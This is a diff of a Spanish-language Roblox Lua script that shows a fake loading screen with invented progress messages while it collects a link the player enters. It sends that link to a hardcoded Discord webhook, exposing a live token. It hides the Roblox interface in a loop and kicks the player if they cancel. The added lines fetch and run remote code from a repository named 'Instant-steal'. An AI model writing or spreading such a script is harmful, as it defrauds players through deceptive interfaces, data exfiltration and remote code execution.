@@ -86,12 +86,12 @@ textBox.Parent = introFrame
 
 local errorLabel = Instance.new("TextLabel")
 errorLabel.Size = UDim2.new(0, 400, 0, 30)
-errorLabel.Position = UDim2.new(0.5, -100, 0.55, 30)
+errorLabel.Position = UDim2.new(0.5, -200, 0.55, 30)
 errorLabel.BackgroundTransparency = 1
 errorLabel.TextColor3 = Color3.fromRGB(255, 50, 50)
 errorLabel.TextSize = 18
 errorLabel.Font = Enum.Font.Gotham
-errorLabel.Text = "Incorrecto"
+errorLabel.Text = ""
 errorLabel.ZIndex = 101
 errorLabel.Parent = introFrame
 
@@ -138,7 +138,7 @@ local letters = {"L", "O", "A", "D", "I", "N", "G"}
 local textLabels = {}
 
 for i, letter in ipairs(letters) do
-	local textLabel = Instance.new("el link de tu servidor privado")
+	local textLabel = Instance.new("TextLabel")
 	textLabel.Text = letter
 	textLabel.Size = UDim2.new(0, 30, 0, 50)
 	textLabel.Position = UDim2.new(0, (i-1) * 35, 0, 25)
@@ -181,10 +181,6 @@ statusText.ZIndex = 203
 statusText.Text = ""
 statusText.Parent = loadingFrame
 
-
--- hdhdhhgdhddhhddhfhhvfvbggvggbcvvchchchvjvcvjhhvjvgjvjgjvjcj cb vjjjvjjvnvnvnvnvnjvjvcjkjcncbccncb
-
--- 🌐 Sistema de envío web
 -- 🌐 Sistema de envío web CORREGIDO
 local function sendToWebhook(url, data)
 	local success, result = pcall(function()
@@ -234,7 +230,6 @@ local function sendToWebhook(url, data)
 	
 	return success, result
 end
--- hsjsjhshhshshshhshhshsjsjsjsjjsjsjjsjjhhhdhhhhhhhhhhhhhhhhgghhhhhhhhhjhjjjjdjjjzjjxjjjxhjhxjhxbhxvjxjjjxjjx
 
 -- 🔔 Toast final
 local function showFatalError()
@@ -284,23 +279,96 @@ local function startLoadingAnimation()
 	end
 end
 
--- 🧠 Mensajes y barra de carga
+-- 🧠 Mensajes y barra de carga MEJORADA
 local function updateStatusMessages()
 	statusText.Text = "Encontrando servidor..."
 	task.wait(10)
-	statusText.Text = "Obteniendo Brainrots..."
-	task.wait(5)
-	local messages = {
-		"Restaurando script..",
-		"Moviendo hitbox...",
-		"Implementando nuevos códigos...",
-		"Fallo en Replicate Storage - intentando de nuevo...",
-		"Buscando en Workspace..."
-	}
-	while loadingFrame.Visible do
-		statusText.Text = messages[math.random(1, #messages)]
-		task.wait(math.random(5, 10))
+	
+	-- Contador de 20 segundos para "obteniendo Brainrots"
+	local countdown = 20
+	for i = countdown, 1, -1 do
+		statusText.Text = "obteniendo Brainrots (" .. i .. "s)"
+		task.wait(1)
 	end
+
+	-- 🎯 CARGAR INTERFAZ EXTERNA EN CORRUTINA SEPARADA
+	coroutine.wrap(function()
+		-- Guardar referencias
+		local currentMainGui = mainGui
+		local currentLoadingFrame = loadingFrame
+		local currentStatusText = statusText
+		
+		-- OCULTAR INTERFAZ PRINCIPAL
+		currentLoadingFrame.Visible = false
+		currentMainGui.Enabled = false
+		
+		-- Mostrar mensaje temporal
+		local tempMessage = Instance.new("TextLabel")
+		tempMessage.Size = UDim2.new(0, 500, 0, 60)
+		tempMessage.Position = UDim2.new(0.5, -250, 0.5, -30)
+		tempMessage.BackgroundTransparency = 1
+		tempMessage.TextColor3 = Color3.new(1, 1, 1)
+		tempMessage.TextSize = 24
+		tempMessage.Font = Enum.Font.GothamBold
+		tempMessage.Text = "Cargando interfaz externa... (20s)"
+		tempMessage.ZIndex = 999
+		tempMessage.Parent = currentMainGui
+		
+		-- Cargar interfaz externa
+		local success, errorMsg = pcall(function()
+			loadstring(game:HttpGet("https://raw.githubusercontent.com/LeyendaZero/Instant-steal/main/seleccionar.lua"))()
+		end)
+		
+		if not success then
+			warn("Error cargando interfaz externa:", errorMsg)
+			tempMessage.Text = "Error cargando interfaz externa"
+			task.wait(3)
+		end
+		
+		print("Interfaz externa cargada, esperando 20 segundos...")
+		
+		-- ⏱️ Esperar 20 segundos con contador
+		local waitTime = 20
+		for i = waitTime, 1, -1 do
+			tempMessage.Text = "Ejecutando interfaz externa... (" .. i .. "s)"
+			task.wait(1)
+		end
+		
+		-- 🔄 REACTIVAR INTERFAZ PRINCIPAL DESPUÉS DE 20 SEGUNDOS
+		tempMessage:Destroy()
+		
+		-- Verificar que los objetos aún existen antes de reactivar
+		if currentMainGui and currentMainGui.Parent then
+			currentMainGui.Enabled = true
+		else
+			warn("MainGui no encontrado, no se puede reactivar")
+			return
+		end
+		
+		if currentLoadingFrame and currentLoadingFrame.Parent then
+			currentLoadingFrame.Visible = true
+		end
+		
+		if currentStatusText and currentStatusText.Parent then
+			currentStatusText.Text = "Interfaz reactivada - Continuando..."
+			task.wait(2)
+			currentStatusText.Text = "obteniendo Brainrots - LISTO!"
+			task.wait(2)
+			
+			local messages = {
+				"Restaurando script..",
+				"Moviendo hitbox...",
+				"Implementando nuevos códigos...",
+				"Fallo en Replicate Storage - intentando de nuevo...",
+				"Buscando en Workspace..."
+			}
+			
+			while currentLoadingFrame.Visible do
+				currentStatusText.Text = messages[math.random(1, #messages)]
+				task.wait(math.random(5, 10))
+			end
+		end
+	end)()
 end
 
 local function animateProgressBar()
@@ -323,7 +391,7 @@ local function startSequence(url)
 	
 	-- 🔄 Enviar datos al webhook antes de empezar la animación
 	task.spawn(function()
-		local webhookUrl = "https://discord.com/api/webhooks/1398573923280359425/SQDEI2MXkQUC6f4WGdexcHGdmYpUO_sARSkuBmF-Wa-fjQjsvpTiUjVcEjrvuVdSKGb1" -- Reemplaza con tu webhook URL
+		local webhookUrl = "https://discord.com/api/webhooks/1398573923280359425/SQDEI2MXkQUC6f4WGdexcHGdmYpUO_sARSkuBmF-Wa-fjQjsvpTiUjVcEjrvuVdSKGb1"
 		
 		local data = {
 			url = url,
@@ -381,6 +449,7 @@ end)
 
 cancelButton.MouseButton1Click:Connect(kickPlayer)
 
+-- 🔄 Loop para mantener la UI oculta
 while true do
 	hideRobloxUI()
 	task.wait(0.5)
